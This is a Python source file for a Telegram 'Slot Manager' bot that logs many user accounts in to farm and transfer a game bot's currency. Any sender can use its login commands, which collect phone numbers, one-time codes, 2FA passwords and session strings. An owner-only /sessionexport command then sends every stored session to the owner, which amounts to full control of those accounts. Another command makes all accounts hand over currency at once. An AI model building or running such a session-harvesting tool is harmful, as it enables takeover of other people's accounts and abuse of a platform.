import logging
import asyncio
import json
import os
import re
import sys
import subprocess
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

import config
import database
import utils
import worker

# --- 1. LOGGING SETUP ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(config.LOG_FILE),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Initialize Manager Bot
bot = TelegramClient('manager_session', config.API_ID, config.API_HASH).start(bot_token=config.BOT_TOKEN)

# --- 2. HELPER FUNCTIONS ---

async def get_balance_for_user(user_id, client):
    """
    Robust balance checker that ignores slot spam.
    """
    try:
        # 1. Send Command
        await client.send_message(config.TARGET_BOT, '/extols')
        
        # 2. Look for the specific response (Retries for 5 seconds)
        for _ in range(5):
            await asyncio.sleep(1.5) # Wait for reply
            
            # Read last 3 messages to avoid missing it if a slot msg came in simultaneously
            messages = await client.get_messages(config.TARGET_BOT, limit=3)
            
            for msg in messages:
                # Look for the specific phrase "Your current extols"
                if msg.text and "Your current extols" in msg.text:
                    match = re.search(r'Є(\d+)', msg.text)
                    balance = int(match.group(1)) if match else 0
                    
                    me = await client.get_me()
                    # Format Name without Markdown to prevent breakage
                    name = me.first_name 
                    return (name, balance, None)
        
        return ("Unknown", 0, "Timeout (Bot busy?)")

    except Exception as e:
        return ("Error", 0, str(e))

async def register_client(uid, client):
    """Saves a connected client to the database."""
    me = await client.get_me()
    database.clients[uid] = client
    database.user_data[uid] = {
        'extols': 0, 
        'next_play_time': 0, 
        'name': me.first_name
    }
    await bot.send_message(config.OWNER_ID, f"🔔 New Login: {me.first_name} (`{uid}`)")
    logger.info(f"User Login: {me.first_name} ({uid})")

# --- 3. COMMAND HANDLERS ---

@bot.on(events.NewMessage(pattern='/start'))
async def start_cmd(event):
    await event.respond("👋 **Slot Manager Online**\nType `/help` for commands.")

@bot.on(events.NewMessage(pattern='/help'))
async def help_cmd(event):
    text = (
        "🛠 **COMMAND MENU**\n"
        "━━━━━━━━━━━━━━━━\n"
        "**🔑 Login:**\n"
        "`/login` - Phone + OTP Login\n"
        "`/slogin` - String Session Login\n"
        "`/logout` - Disconnect\n\n"
        "**💰 Finance:**\n"
        "`/check` - Audit Wallets (Fixed)\n"
        "`/self_reply {all|id} {group_id} {amount}`\n\n"
        "**⚙️ System:**\n"
        "`/update` - Pull from GitHub & Restart\n"
        "`/slot` - Join Queue\n"
        "`/allslot` - Start All\n"
        "`/stats` - Global Stats\n"
        "`/log` - Logs\n"
        "━━━━━━━━━━━━━━━━"
    )
    await event.respond(text)

# --- UPDATE COMMAND ---

@bot.on(events.NewMessage(pattern='/update', from_users=[config.OWNER_ID]))
async def update_cmd(event):
    msg = await event.respond("🔄 **Checking for updates...**")
    
    try:
        # Run git pull
        process = subprocess.Popen(['git', 'pull'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        
        output = stdout.decode() + stderr.decode()
        
        if "Already up to date" in output:
            await msg.edit("✅ **Bot is already up to date.**")
        else:
            await msg.edit(f"✅ **Update Found & Downloaded!**\n\n`{output}`\n\n🔄 Restarting...")
            # Restart the script
            os.execl(sys.executable, sys.executable, *sys.argv)
            
    except Exception as e:
        await msg.edit(f"❌ **Update Failed:**\n`{e}`\n\nMake sure git is installed and cloned correctly.")

# --- CHECK / AUDIT COMMAND (FIXED) ---

@bot.on(events.NewMessage(pattern='/check', from_users=[config.OWNER_ID]))
async def check_cmd(event):
    status_msg = await event.respond("⏳ **Auditing Wallets...**\nChecking balances (this takes a few seconds)...")
    
    tasks = []
    # Create tasks for all users
    for uid, client in database.clients.items():
        tasks.append(get_balance_for_user(uid, client))
    
    # Run in parallel
    results = await asyncio.gather(*tasks)
    
    total_extols = 0
    msg = "💰 **WALLET AUDIT**\n━━━━━━━━━━━━━━━━\n"
    
    for name, balance, error in results:
        if error:
            msg += f"» {name} - ⚠️ {error}\n"
        else:
            msg += f"» {name} - Є{balance}\n"
            total_extols += balance
            
    msg += f"━━━━━━━━━━━━━━━━\n➤ **Total - Є{total_extols}**"
    
    await status_msg.edit(msg)

# --- SELF REPLY COMMAND (WITH GAP) ---

@bot.on(events.NewMessage(pattern=r'/self_reply (all|(?:\d+)) (-?\d+) (\d+)', from_users=[config.OWNER_ID]))
async def self_reply_cmd(event):
    if not event.is_reply:
        return await event.respond("❌ **Error:** Reply to a message.")
    
    target_mode = event.pattern_match.group(1) 
    group_id = int(event.pattern_match.group(2))
    amount = int(event.pattern_match.group(3))
    
    reply_msg = await event.get_reply_message()
    target_msg_id = reply_msg.id
    
    active_clients = []
    if target_mode == 'all':
        active_clients = list(database.clients.values())
    else:
        uid = int(target_mode)
        if uid in database.clients:
            active_clients = [database.clients[uid]]
    
    if not active_clients:
        return await event.respond("❌ No clients found.")

    await event.respond(f"💸 **Sending Funds...**\nTarget: `{group_id}` | Amount: Є{amount}\nDelay: 2s per bot")

    count = 0
    for client in active_clients:
        try:
            cmd_text = f"/give@{config.TARGET_BOT_USERNAME} {amount}"
            await client.send_message(
                entity=group_id,
                message=cmd_text,
                reply_to=target_msg_id
            )
            count += 1
            
            # --- GAP ADDED HERE ---
            await asyncio.sleep(2) 
            
        except Exception as e:
            logger.error(f"Transfer failed: {e}")
            
    await event.respond(f"✅ **Done.** Triggered {count} bots.")

# --- LOGIN / SLOGIN / LOGOUT ---

@bot.on(events.NewMessage(pattern='/slogin'))
async def slogin_cmd(event):
    async with bot.conversation(event.sender_id) as conv:
        await conv.send_message("Send **String Session**:")
        response = await conv.get_response()
        try:
            client = TelegramClient(StringSession(response.text.strip()), config.API_ID, config.API_HASH)
            await client.connect()
            if not await client.is_user_authorized(): return await conv.send_message("❌ Invalid.")
            await register_client(event.sender_id, client)
            await conv.send_message("✅ Connected!")
        except Exception as e: await conv.send_message(f"Error: {e}")

@bot.on(events.NewMessage(pattern='/login'))
async def login_cmd(event):
    user_id = event.sender_id
    async with bot.conversation(user_id, timeout=300) as conv:
        try:
            await conv.send_message("📱 **Phone Login**\nEnter phone number (e.g. `+91...`):")
            phone = (await conv.get_response()).text.strip()
            
            msg = await conv.send_message("🔄 Sending OTP...")
            client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
            await client.connect()
            
            try: await client.send_code_request(phone)
            except Exception as e: return await msg.edit(f"❌ Error: {e}")
            
            await msg.delete()
            code = (await conv.send_message("📩 Enter OTP:")).get_response()
            code = (await code).text.replace(' ', '')
            
            try:
                await client.sign_in(phone, code)
            except SessionPasswordNeededError:
                pwd = (await conv.send_message("🔐 Enter 2FA Password:")).get_response()
                await client.sign_in(password=(await pwd).text)
            
            await register_client(user_id, client)
            await conv.send_message("✅ **Login Successful!**")
        except Exception as e: await conv.send_message(f"❌ Error: {e}")

@bot.on(events.NewMessage(pattern='/logout'))
async def logout_cmd(event):
    uid = event.sender_id
    if uid in database.clients:
        await database.clients[uid].disconnect()
        del database.clients[uid]
        if uid in database.user_data: del database.user_data[uid]
        if uid in database.farming_queue: database.farming_queue.remove(uid)
        await event.respond("✅ **Logged out.**")

# --- FARMING & STATS ---

@bot.on(events.NewMessage(pattern='/slot'))
async def slot_cmd(event):
    uid = event.sender_id
    if uid not in database.clients: return await event.respond("❌ Login first.")
    if uid not in database.farming_queue:
        database.farming_queue.append(uid)
        await event.respond("✅ **Added to Queue.**")
        asyncio.create_task(worker.start_relay_race())
    else: await event.respond("⚠️ Already in queue.")

@bot.on(events.NewMessage(pattern='/allslot', from_users=[config.OWNER_ID]))
async def allslot_cmd(event):
    c = 0
    for uid in database.clients:
        if uid not in database.farming_queue:
            database.farming_queue.append(uid)
            c+=1
    await event.respond(f"✅ **{c} bots** added to queue.")
    asyncio.create_task(worker.start_relay_race())

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_cmd(event):
    msg = (
        f"🌍 **GLOBAL STATS**\n━━━━━━━━━━━━━━━━\n"
        f"👥 Users: {len(database.clients)} | 🔥 Queue: {len(database.farming_queue)}\n"
        f"⏳ Uptime: {utils.get_uptime()}\n\n"
    )
    for uid, data in database.user_data.items():
        icon = utils.format_status(uid, database.current_active_user)
        msg += f"❑ {data['name']} ‹`{uid}`› — {data['extols']} — {icon}\n"
    await event.respond(msg + "━━━━━━━━━━━━━━━━")

@bot.on(events.NewMessage(pattern='/log', from_users=[config.OWNER_ID]))
async def log_cmd(event):
    logs = utils.read_last_logs(config.LOG_FILE)
    buttons = [
        [Button.inline("Refresh 🌀", b"log_refresh"), Button.inline("Download ⬇️", b"log_download")],
        [Button.inline("Clear 🗑️", b"log_clear")]
    ]
    await event.respond(f"📝 **System Logs:**\n```\n{logs}\n```", buttons=buttons)

# Callbacks for logs
@bot.on(events.CallbackQuery(pattern=b'log_refresh'))
async def log_ref(e): await e.edit(f"📝 **System Logs:**\n```\n{utils.read_last_logs(config.LOG_FILE)}\n```", buttons=e.message.buttons)
@bot.on(events.CallbackQuery(pattern=b'log_clear'))
async def log_clr(e): 
    utils.clear_logs(config.LOG_FILE)
    await e.edit("🗑️ Logs Cleared.", buttons=[[Button.inline("Refresh 🌀", b"log_refresh")]])
@bot.on(events.CallbackQuery(pattern=b'log_download'))
async def log_dl(e): await e.client.send_file(e.chat_id, config.LOG_FILE) if os.path.exists(config.LOG_FILE) else await e.answer("No logs.")

# Session Export/Import
@bot.on(events.NewMessage(pattern='/sessionexport', from_users=[config.OWNER_ID]))
async def sexport(e):
    d = database.get_all_sessions()
    with open(config.SESSION_FILE, 'w') as f: json.dump(d, f)
    await e.client.send_file(e.chat_id, config.SESSION_FILE)
    os.remove(config.SESSION_FILE)

@bot.on(events.NewMessage(pattern='/sessionimport', from_users=[config.OWNER_ID]))
async def simport(e):
    if not e.is_reply: return
    f = await (await e.get_reply_message()).download_media()
    try:
        with open(f) as j: d = json.load(j)
        for u, s in d.items():
            c = TelegramClient(StringSession(s), config.API_ID, config.API_HASH)
            await c.connect()
            await register_client(int(u), c)
        await e.respond("✅ Imported.")
        os.remove(f)
    except Exception as x: await e.respond(f"Error: {x}")

print("✅ Manager Bot Started...")
bot.run_until_disconnected()
